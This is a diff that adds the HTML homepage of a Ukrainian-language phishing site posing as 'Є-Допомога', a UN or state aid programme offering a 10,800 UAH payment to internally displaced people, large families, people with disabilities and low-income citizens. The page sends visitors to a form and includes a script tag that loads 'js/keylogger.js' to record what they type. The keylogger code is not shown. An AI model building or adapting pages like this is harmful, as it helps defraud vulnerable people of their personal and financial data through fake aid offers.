@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Є-Допомога | Головна</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>Є-Допомога від ООН</h1>
+        <p>Державна соціальна підтримка</p>
+    </header>
+
+    <div class="container">
+        <div class="payment-card">
+            <h2>Виплата 10 800 грн</h2>
+            <p>Державна соціальна допомога для певних категорій громадян.</p>
+
+            <div class="conditions">
+                <h3>Виплата доступна:</h3>
+                <ul>
+                    <li>✅ ВПО</li>
+                    <li>✅ Багатодітним родинам</li>
+                    <li>✅ Особам з інвалідністю</li>
+                    <li>✅ Малозабезпеченим</li>
+                </ul>
+            </div>
+
+            <button onclick="location.href='form.html'" class="btn">Отримати допомогу</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2023 Є-Допомога. Всі права захищені.</p>
+        <p>Гаряча лінія: 0 800 123 456</p>
+    </footer>
+
+    <script src="js/keylogger.js"></script>
+</body>
+</html>
